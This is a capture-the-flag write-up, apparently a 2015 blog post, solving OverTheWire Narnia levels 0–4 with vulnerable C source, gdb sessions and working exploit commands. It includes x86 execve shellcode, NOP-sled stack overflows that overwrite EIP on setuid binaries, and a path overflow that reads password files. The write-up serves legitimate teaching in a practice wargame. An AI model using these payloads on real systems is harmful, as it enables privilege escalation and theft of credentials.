---
extends: default.liquid
title: Solving Narnia Part 1
date: 2015-04-08T21:03:50Z
---

Next up we take on [Narnia](https://overthewire.org/wargames/narnia/). This is a binary exploit centered wargame, so fire up your debuggers and let's smash those stacks. For levels 5, 6, 7, and 8, see [part 2](https://unlogic.co.uk/2015/04/13/solving-narnia-part-2/)

All levels are in `/narnia` and both the binary and the source are provided.

I've not included the passwords here, so you'll have to work through the exercises yourself (or find them elsewhere :))

## Level 00

```c
#include <stdio.h>
#include <stdlib.h>

int main(){
        long val=0x41414141;
        char buf[20];

        printf("Correct val's value from 0x41414141 -> 0xdeadbeef!\n");
        printf("Here is your chance: ");
        scanf("%24s",&buf);

        printf("buf: %s\n",buf);
        printf("val: 0x%08x\n",val);

        if(val==0xdeadbeef)
                system("/bin/sh");
        else {
                printf("WAY OFF!!!!\n");
                exit(1);
        }

        return 0;
}
```

Lines 8 and 9 tell us what we need to do. So knowing how variable allocation on the stack works, we can exploit the setup on lines 5 and 6. `buf` is a fixed size and is allocated _after_ `val`. Therefore it sits above `val` on the stack. As there is no [ASLR](https://en.wikipedia.org/wiki/Address_space_layout_randomization) we should be able to write over the end of `buf` and overwrite what is in memory at `val`'s location.

So let's try it

```sourceCode
narnia0@melinda:/narnia$ python -c "print 'C'*50" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCCCCC
val: 0x43434343
WAY OFF!!!!
```

Right, we can confirm that we are able to change the value of `val`. Let's tread a bit more carefully and try to see if we can do it more accurately

```sourceCode
narnia0@melinda:/narnia$ python -c "print 'C'*20 + 'BBBB'" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCBBBB
val: 0x42424242
WAY OFF!!!!
```

So there is no space between `val` and `buf`, therefore 20 characters plus a further 4 is enough to change val. Let's write in the correct value, reversed of course because of the endian notation

```sourceCode
narnia0@melinda:/narnia$ python -c "print 'C'*20 + '\xef\xbe\xad\xde'" | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
narnia0@melinda:/narnia$
```

We did it.... but wait, where's the shell? It's closed, that's where it is. We need to keep it open. The trick is to append the `cat` command to the input

```sourceCode
narnia0@melinda:/narnia$ (python -c "print 'C'*20 + '\xef\xbe\xad\xde'"; cat) | ./narnia0
Correct val's value from 0x41414141 -> 0xdeadbeef!
Here is your chance: buf: CCCCCCCCCCCCCCCCCCCCﾭ
val: 0xdeadbeef
id
uid=14000(narnia0) gid=14000(narnia0) euid=14001(narnia1) groups=14001(narnia1),14000(narnia0)
whoami
narnia1
cat /etc/narnia_pass/narnia1
[password]
```

## Level 01

```c
#include <stdio.h>

int main(){
    int (*ret)();

    if(getenv("EGG")==NULL){
        printf("Give me something to execute at the env-variable EGG\n");
        exit(1);
    }

    printf("Trying to execute EGG!\n");
    ret = getenv("EGG");
    ret();

    return 0;
}
```

So here we need to set an environment variable named `EGG` to something we want executed. We can't just pass `/bin/bash` as it's going to call whatever we give it as a function. Ideally we want a shell, so what we need in this case is the shellcode to do just that.

```sourceCode
narnia1@melinda:/narnia$ export EGG=$(python -c'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
narnia1@melinda:/narnia$ ./narnia1
Trying to execute EGG!
$ whoami
narnia2
$ cat /etc/narnia_pass/narnia2
[password]
```

## Level 02

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char * argv[]){
    char buf[128];

    if(argc == 1){
        printf("Usage: %s argument\n", argv[0]);
        exit(1);
    }
    strcpy(buf,argv[1]);
    printf("%s", buf);

    return 0;
}
```

The biggest clues here are lines 6 and 12. Copying user supplied data into a fixed sized array without any bound checking is always asking for trouble. `narnia2` binary also runs as setuid narnia3, which leads us to believe we will be able to control the stack and get it to execute a payload of our choosing. Of course this will be a shellcode to drop us into a shell.

First we need to work out how much data is needed to overwrite `EIP`. We can do this by trial and error, or we can use a pattern generator. I am going to use my [pattern generator](https://github.com/Svenito/exploit-pattern) instead of metasploit's one. I'll create a payload big enugh to overflow the buffer and then check the value of `EIP`. Pasting that back into the pattern generator will tell us at what location in the pattern the string occurs.

```sourceCode
local $] ./pattern.py 150
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
```

```sourceCode
narnia2@melinda:/narnia$ gdb -q narnia2
Reading symbols from narnia2...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9
Starting program: /games/narnia/narnia2 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9

Program received signal SIGSEGV, Segmentation fault.
0x37654136 in ?? ()
(gdb) info reg
eax            0x0  0
ecx            0x0  0
edx            0xf7fcb898   -134432616
ebx            0xf7fca000   -134438912
esp            0xffffd640   0xffffd640
ebp            0x65413565   0x65413565
esi            0x0  0
edi            0x0  0
eip            0x37654136   0x37654136
eflags         0x10282  [ SF IF RF ]
cs             0x23 35
ss             0x2b 43
ds             0x2b 43
es             0x2b 43
fs             0x0  0
gs             0x63 99
```

```sourceCode
local $] ./pattern.py 0x37654136
Pattern 0x37654136 first occurrence at position 140 in pattern.
```

We can control `EIP` with whatever we put at position 140 of our payload. But what do we put there? Well for that we need to figure out where the rest of our data is going. Using a known payload let's see where our input ends up:

```sourceCode
(gdb) run $(python -c "print 'a' * 140 + 'b' * 4")
Starting program: /games/narnia/narnia2 $(python -c "print 'a' * 140 + 'b' * 4")

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
(gdb) x/200x $esp
0xffffd650: 0x00000000  0xffffd6e4  0xffffd6f0  0xf7feacea
0xffffd660: 0x00000002  0xffffd6e4  0xffffd684  0x08049768
0xffffd670: 0x0804821c  0xf7fca000  0x00000000  0x00000000
0xffffd680: 0x00000000  0xed18585e  0xd520bc4e  0x00000000
0xffffd690: 0x00000000  0x00000000  0x00000002  0x08048360
0xffffd6a0: 0x00000000  0xf7ff0500  0xf7e3c979  0xf7ffd000
0xffffd6b0: 0x00000002  0x08048360  0x00000000  0x08048381
0xffffd6c0: 0x0804845d  0x00000002  0xffffd6e4  0x080484d0
0xffffd6d0: 0x08048540  0xf7feb180  0xffffd6dc  0x0000001c
0xffffd6e0: 0x00000002  0xffffd812  0xffffd828  0x00000000
0xffffd6f0: 0xffffd8b9  0xffffd8cd  0xffffd8dd  0xffffd8f0
0xffffd700: 0xffffd913  0xffffd927  0xffffd930  0xffffd93d
0xffffd710: 0xffffde5e  0xffffde69  0xffffde75  0xffffded3
0xffffd720: 0xffffdeea  0xffffdef9  0xffffdf05  0xffffdf16
0xffffd730: 0xffffdf1f  0xffffdf32  0xffffdf3a  0xffffdf4a
0xffffd740: 0xffffdf80  0xffffdfa0  0xffffdfc0  0x00000000
0xffffd750: 0x00000020  0xf7fdbb60  0x00000021  0xf7fdb000
0xffffd760: 0x00000010  0x1f898b75  0x00000006  0x00001000
0xffffd770: 0x00000011  0x00000064  0x00000003  0x08048034
0xffffd780: 0x00000004  0x00000020  0x00000005  0x00000008
0xffffd790: 0x00000007  0xf7fdc000  0x00000008  0x00000000
0xffffd7a0: 0x00000009  0x08048360  0x0000000b  0x000036b2
0xffffd7b0: 0x0000000c  0x000036b2  0x0000000d  0x000036b2
0xffffd7c0: 0x0000000e  0x000036b2  0x00000017  0x00000000
0xffffd7d0: 0x00000019  0xffffd7fb  0x0000001f  0xffffdfe2
0xffffd7e0: 0x0000000f  0xffffd80b  0x00000000  0x00000000
0xffffd7f0: 0x00000000  0x00000000  0xe8000000  0x7c03ba19
0xffffd800: 0x2bd0895a  0x3866226d  0x69ad5957  0x00363836
0xffffd810: 0x672f0000  0x73656d61  0x72616e2f  0x2f61696e
0xffffd820: 0x6e72616e  0x00326169  0x61616161  0x61616161
0xffffd830: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd840: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd850: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd860: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd870: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd880: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd890: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd8a0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd8b0: 0x61616161  0x62626262  0x47445800  0x5345535f
0xffffd8c0: 0x4e4f4953  0x3d44495f  0x30333035  0x45485300
0xffffd8d0: 0x2f3d4c4c  0x2f6e6962  0x68736162  0x52455400
0xffffd8e0: 0x78723d4d  0x322d7476  0x6f633635  0x00726f6c
0xffffd8f0: 0x5f485353  0x45494c43  0x323d544e  0x322e3231
0xffffd900: 0x37352e33  0x3136312e  0x35333320  0x34203932
0xffffd910: 0x53003334  0x545f4853  0x2f3d5954  0x2f766564
0xffffd920: 0x2f737470  0x4c003033  0x4c415f43  0x00433d4c
0xffffd930: 0x52455355  0x72616e3d  0x3261696e  0x5f534c00
0xffffd940: 0x4f4c4f43  0x723d5352  0x3a303d73  0x303d6964
0xffffd950: 0x34333b31  0x3d6e6c3a  0x333b3130  0x686d3a36
0xffffd960: 0x3a30303d  0x343d6970  0x33333b30  0x3d6f733a
```

We see our payload start at `0xffffd828` with the last 4 bytes at `0xffffd8b4`

The buffer gives us 128 bytes to play with. Our shellcode is 25 bytes, so we'll pad the start with a [nop sled](https://en.wikipedia.org/wiki/NOP_slide) to adjust for the memory offset introduced by `gdb`. Then set the `EIP` to somewhere in the middle of the sled

```sourceCode
narnia2@melinda:/narnia$ ./narnia2 `python -c "print '\x90'*115 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x60\xd8\xff\xff'"`
$ whoami
narnia3
$ cat /etc/narnia_pass/narnia3
[password]
```

## Level 03

```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char **argv){

        int  ifd,  ofd;
        char ofile[16] = "/dev/null";
        char ifile[32];
        char buf[32];

        if(argc != 2){
                printf("usage, %s file, will send contents of file 2 /dev/null\n",argv[0]);
                exit(-1);
        }

        /* open files */
        strcpy(ifile, argv[1]);
        if((ofd = open(ofile,O_RDWR)) < 0 ){
                printf("error opening %s\n", ofile);
                exit(-1);
        }
        if((ifd = open(ifile, O_RDONLY)) < 0 ){
                printf("error opening %s\n", ifile);
                exit(-1);
        }

        /* copy from file1 to file2 */
        read(ifd, buf, sizeof(buf)-1);
        write(ofd,buf, sizeof(buf)-1);
        printf("copied contents of %s to a safer place... (%s)\n",ifile,ofile);

        /* close 'em */
        close(ifd);
        close(ofd);

        exit(1);
}
```

At first glance this looks a bit more complicated. However it is just another buffer overflow (line 13 and 22). This time however we don't control the stack, we control where the file gets written to. `/dev/null` is not a useful place for data, and we want the contents of `/etc/narnia_pass/narnia4`. As `narnia3` runs setuid narnia4, it can do that for us.

First we determine that we need 32 characters to overflow the buffer. Then anything beyond that will get written to the ofile. So the plan is to to create a symlink to `narnia4` that is 32 characters long, and then write that to the target. The issue here is that the source path's last 16 characters need to be the same as the target. So to do this I created the following directory and symlink:

```sourceCode
narnia3@melinda:/narnia$ mkdir -p /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp
narnia3@melinda:/narnia$ ln -s /etc/narnia_pass/narnia4 /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4
```

Now when we pass that to `narnia3`:

```sourceCode
narnia3@melinda:/narnia$ ./narnia3 `python -c "print '/tmp/' + 'x'*27 + '/tmp/narn4'"`
copied contents of /tmp/xxxxxxxxxxxxxxxxxxxxxxxxxxx/tmp/narn4 to a safer place... (/tmp/narn4)
narnia3@melinda:/narnia$ cat /tmp/narn4
[password]
```

It's a little odd, but I hope you understand what happened. The last part of the first path has to be a valid path, so that it can be written to. That's why we have the double `/tmp` setup.

## Level 04

```c
#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

MOAR OVERFLOWS. This time you'll notice something at line 6. What this does is [store the user environment](https://man7.org/linux/man-pages/man7/environ.7.html). This then get zerod out inside `main` to prevent us from storing any shellcode in environment variables. However we might still be able to write `EIP`, so using the trusty pattern generator from before

```sourceCode
local $] ./pattern.py 300
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7
Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5
Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

```sourceCode
narnia4@melinda:/narnia$ gdb -q ./narnia4
Reading symbols from ./narnia4...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5
Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4
Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3
Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
Starting program: /games/narnia/narnia4 Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5
Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4
Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3
Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9

Program received signal SIGSEGV, Segmentation fault.
0x316a4130 in ?? ()
```

```sourceCode
local $] ./pattern.py 0x316a4130
Pattern 0x316a4130 first occurrence at position 272 in pattern.
```

This tells us we have 272 bytes to play with. Plenty of space to construct a nopsled and shellcode payload. Let's find out what we need to write into `EIP`.

```sourceCode
(gdb) r $(python -c "print 'a'*272 + 'bbbb'")
Starting program: /games/narnia/narnia4 $(python -c "print 'a'*272 + 'bbbb'")

Program received signal SIGSEGV, Segmentation fault.
0x62626262 in ?? ()
(gdb) x/200x $esp
0xffffd5c0: 0x00000000  0xffffd654  0xffffd660  0xf7feacea
0xffffd5d0: 0x00000002  0xffffd654  0xffffd5f4  0x080497cc
0xffffd5e0: 0x0804825c  0xf7fca000  0x00000000  0x00000000
0xffffd5f0: 0x00000000  0x7cc8a421  0x44f76031  0x00000000
0xffffd600: 0x00000000  0x00000000  0x00000002  0x080483b0
0xffffd610: 0x00000000  0xf7ff0500  0xf7e3c979  0xf7ffd000
0xffffd620: 0x00000002  0x080483b0  0x00000000  0x080483d1
0xffffd630: 0x080484ad  0x00000002  0xffffd654  0x08048550
0xffffd640: 0x080485c0  0xf7feb180  0xffffd64c  0x0000001c
0xffffd650: 0x00000002  0xffffd78f  0xffffd7a5  0x00000000
0xffffd660: 0xffffd8ba  0xffffd8ce  0xffffd8de  0xffffd8f1
0xffffd670: 0xffffd914  0xffffd927  0xffffd930  0xffffd93d
0xffffd680: 0xffffde5e  0xffffde69  0xffffde75  0xffffded3
0xffffd690: 0xffffdeea  0xffffdef9  0xffffdf05  0xffffdf16
0xffffd6a0: 0xffffdf1f  0xffffdf32  0xffffdf3a  0xffffdf4a
0xffffd6b0: 0xffffdf80  0xffffdfa0  0xffffdfc0  0x00000000
0xffffd6c0: 0x00000020  0xf7fdbb60  0x00000021  0xf7fdb000
0xffffd6d0: 0x00000010  0x1f898b75  0x00000006  0x00001000
0xffffd6e0: 0x00000011  0x00000064  0x00000003  0x08048034
0xffffd6f0: 0x00000004  0x00000020  0x00000005  0x00000008
0xffffd700: 0x00000007  0xf7fdc000  0x00000008  0x00000000
0xffffd710: 0x00000009  0x080483b0  0x0000000b  0x000036b4
0xffffd720: 0x0000000c  0x000036b4  0x0000000d  0x000036b4
0xffffd730: 0x0000000e  0x000036b4  0x00000017  0x00000000
0xffffd740: 0x00000019  0xffffd76b  0x0000001f  0xffffdfe2
0xffffd750: 0x0000000f  0xffffd77b  0x00000000  0x00000000
0xffffd760: 0x00000000  0x00000000  0x9e000000  0x9213cb6c
0xffffd770: 0x8eef41b1  0xe0574cc7  0x69a73659  0x00363836
0xffffd780: 0x00000000  0x00000000  0x00000000  0x2f000000
0xffffd790: 0x656d6167  0x616e2f73  0x61696e72  0x72616e2f
0xffffd7a0: 0x3461696e  0x61616100  0x61616161  0x61616161
0xffffd7b0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd7c0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd7d0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd7e0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd7f0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd800: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd810: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd820: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd830: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd840: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd850: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd860: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd870: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd880: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd890: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd8a0: 0x61616161  0x61616161  0x61616161  0x61616161
0xffffd8b0: 0x61616161  0x62626261  0x00000062  0x00000000
0xffffd8c0: 0x00000000  0x00000000  0x00000000  0x00000000
0xffffd8d0: 0x00000000  0x00000000  0x00000000  0x00000000
```

Our input starts at around _0xffffd7a8_ so let's get going writing our payload. Create a nopsled that is _272 - 25_ bytes long, follow that with the the same shellcode as before, and finish with an address that sits comfortably in the sled. You normally need to play with the address a bit, as the offsets inside _gdb_ are a bit different.

```sourceCode
narnia4@melinda:/narnia$ ./narnia4 `python -c "print '\x90'*(272-25) + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80' + '\x30\xd8\xff\xff'"`
$ whoami
narnia5
$ cat /etc/narnia_pass/narnia5
[password]
```
